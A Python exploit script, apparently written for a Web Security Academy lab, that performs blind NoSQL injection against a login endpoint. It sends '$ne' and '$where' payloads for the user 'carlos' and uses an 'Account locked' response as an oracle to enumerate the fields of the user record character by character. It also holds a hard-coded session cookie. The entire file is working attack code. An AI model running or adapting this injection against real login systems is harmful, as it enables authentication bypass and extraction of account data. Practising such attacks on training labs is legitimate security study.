#!/usr/bin/env python3
import requests
import string

url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login"
headers = {
    "Cookie": "session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc",
    "Content-Type": "application/json"
}

# First find how many fields exist
print("Finding number of fields...")
num_fields = 0
for i in range(10):
    payload = {
        "username": "carlos",
        "password": {"$ne": "invalid"},
        "$where": f"Object.keys(this)[{i}]"
    }

    response = requests.post(url, headers=headers, json=payload)
    if "Account locked" in response.text:
        num_fields = i + 1
    else:
        break

print(f"Found {num_fields} fields\n")

# Extract each field name
for field_index in range(num_fields):
    field_name = ""
    found_length = 0

    # Find the length
    for length in range(1, 30):
        payload = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": f"Object.keys(this)[{field_index}].match('^.{{{length}}}$')"
        }

        response = requests.post(url, headers=headers, json=payload)
        if "Account locked" in response.text:
            found_length = length
            break

    if found_length == 0:
        print(f"Field [{field_index}]: Could not determine length")
        continue

    # Extract each character
    charset = string.ascii_lowercase + string.digits + "_$"
    for position in range(found_length):
        found = False
        for char in charset:
            # Escape special regex characters
            if char in ".*+?[]{}()^$|\\":
                char = "\\" + char

            payload = {
                "username": "carlos",
                "password": {"$ne": "invalid"},
                "$where": f"Object.keys(this)[{field_index}].match('^.{{{position}}}{char}.*')"
            }

            response = requests.post(url, headers=headers, json=payload)
            if "Account locked" in response.text:
                clean_char = char.replace("\\", "")
                field_name += clean_char
                found = True
                break

        if not found:
            break

    print(f"Field [{field_index}]: {field_name}")